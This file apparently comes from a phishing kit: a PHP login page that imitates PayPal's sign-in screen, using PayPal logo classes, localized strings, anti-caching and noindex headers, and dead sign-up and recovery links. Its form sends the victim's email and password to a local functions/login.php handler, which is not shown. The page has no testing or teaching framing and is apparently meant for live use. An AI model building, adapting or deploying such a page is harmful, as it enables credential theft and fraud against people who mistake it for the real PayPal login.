<?php

	require_once __DIR__.'/functions/functions.php';
	require __DIR__.'/functions/crypt.php';
	require_once __DIR__.'/../lang/detect.php';

?>
<!DOCTYPE html>
<html>
<head>
	<title><?php echo $P3_text1; ?></title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="cache-control" content="no-store">
	<meta http-equiv="cache-control" content="max-age=0">
	<meta http-equiv="expires" content="-1">
	<meta http-equiv="pragma" content="no-cache">
	<meta name="robots" content="noindex,nofollow">
	<link rel="stylesheet" type="text/css" href="../assets/css/signin.css">
	<link rel="stylesheet" type="text/css" href="../assets/css/bootstrap.min.css">
	<script type="text/javascript" src="../assets/js/jquery.min.js"></script>
	<script type="text/javascript" src="../assets/js/custom.js"></script>
	<script type="text/javascript" src="../assets/signin.js"></script>
	<link rel="shortcut icon" href=".../assets/img//icon.ico" />
</head>
<body>
<center>
	<div class="corral">
		<div id="content" class="contentContainer">
	  <header>
	    <p class="paypal-logo paypal-logo-long">
	      <?php $P3_text2; ?>
	    </p>
	  </header>
	  <h1 class="headerText accessAid">
	    <?php echo $P3_text3; ?>
	  </h1>

	  <?php if (isset($_GET['error_id'])) { ?>
	  <div id="notifications" class="notifications" tabindex="-1">
	  	<p class="notification notification-critical" role="alert"><?php echo $P3_text4; ?></p>
	  </div>
	  <?php  } ?>

	  <form action="functions/login.php" method="post" id="form_signin">

	    <div id="passwordSection" class="clearfix">
	      <div class="textInput" id="login_emaildiv">
	        <div class="fieldWrapper">
	          <label for="email" class="fieldLabel">
	            <?php echo $P3_text5; ?>
	          </label>
	          <input id="email" name="EM" class="hasHelp  validateEmpty  "  aria-required="true" autocomplete="off" placeholder="Email address">
	        </div>
	        <div class="errorMessage" id="emailErrorMessage">
	          <p class="emptyError hide">
	            <?php echo $P3_text6; ?>
	          </p>
	          <p class="invalidError hide">
	            <?php echo $P3_text7; ?>
	          </p>
	        </div>
	      </div>
	      <div class="textInput lastInputField" id="login_passworddiv">
	        <div class="fieldWrapper">
	          <label for="password" class="fieldLabel">
	            <?php echo $P3_text8; ?>
	          </label>
	          <input id="password" name="PW" type="password" class="hasHelp  validateEmpty  "  aria-required="true" value="" placeholder="Password">
	        </div>
	        <div class="errorMessage" id="passwordErrorMessage">
	          <p class="emptyError hide">
	            <?php echo $P3_text9; ?>
	          </p>
	        </div>
	      </div>
	    </div>
	    <div class="actions actionsSpaced">
	      <button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">
	        <?php echo $P3_text10; ?>
	      </button>
	    </div>
	    <div class="forgotLink">
	      <a href="#">
	        <?php echo $P3_text11; ?>
	      </a>
	    </div>
	  </form>
	  <a href="#" class="button secondary" id="createAccount">
	    Sign Up
	  </a>
	</div>
	</div>
	<div class="transitioning spinner hide" id="checking_info" aria-busy="true"><p class="checkingInfo"><?php echo $P3_text12; ?></p><p class="oneSecond hide"><?php echo $P3_text13; ?></p></div>
</center>
</body>
</html>